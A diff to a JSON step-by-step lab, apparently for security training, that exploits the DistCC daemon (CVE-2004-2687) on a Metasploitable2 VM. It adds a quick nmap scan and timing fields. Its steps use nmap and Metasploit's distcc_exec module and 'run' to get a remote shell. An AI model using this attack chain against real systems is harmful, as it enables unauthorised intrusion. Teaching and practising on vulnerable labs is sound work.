@@ -9,21 +9,31 @@
   "description": "Metasploitable2 is a deliberately vulnerable Linux VM created by Rapid7 for security training. The DistCC (Distributed C Compiler) daemon allows remote code execution due to a misconfiguration. This is CVE-2004-2687.",
   "steps": [
     {
-      "title": "Scan the target for open ports",
+      "title": "Quick scan for DistCC port",
+      "command": "nmap -sV -p 3632 172.20.0.20",
+      "explanation": "Check if DistCC is running on the default port. Use this instead of a full port scan to save time.",
+      "expected": "3632/tcp open  distccd",
+      "duration": "5-10 sec"
+    },
+    {
+      "title": "Optional: Full port scan",
       "command": "nmap -sV -p- 172.20.0.20 --open",
-      "explanation": "Full port scan to discover all services. Metasploitable2 has many vulnerable services. We're looking for port 3632 (DistCC).",
-      "expected": "3632/tcp open  distccd"
+      "explanation": "Full port scan to discover ALL services. Metasploitable2 has many vulnerable services. WARNING: This takes a long time!",
+      "expected": "Many open ports including 21, 22, 23, 80, 3632, etc.",
+      "duration": "3-5 min"
     },
     {
       "title": "Start Metasploit",
       "command": "msfconsole -q",
-      "explanation": "Launch Metasploit Framework in quiet mode."
+      "explanation": "Launch Metasploit Framework in quiet mode.",
+      "duration": "5-15 sec"
     },
     {
       "title": "Search for DistCC exploits",
       "command": "search distcc",
       "explanation": "Find exploits for the DistCC service.",
-      "expected": "exploit/unix/misc/distcc_exec"
+      "expected": "exploit/unix/misc/distcc_exec",
+      "duration": "1-2 sec"
     },
     {
       "title": "Load the DistCC exploit",
@@ -54,7 +64,8 @@
       "title": "Run the exploit",
       "command": "run",
       "explanation": "Execute the exploit and get a shell.",
-      "expected": "Command shell session opened"
+      "expected": "Command shell session opened",
+      "duration": "2-5 sec"
     },
     {
       "title": "Check your access",
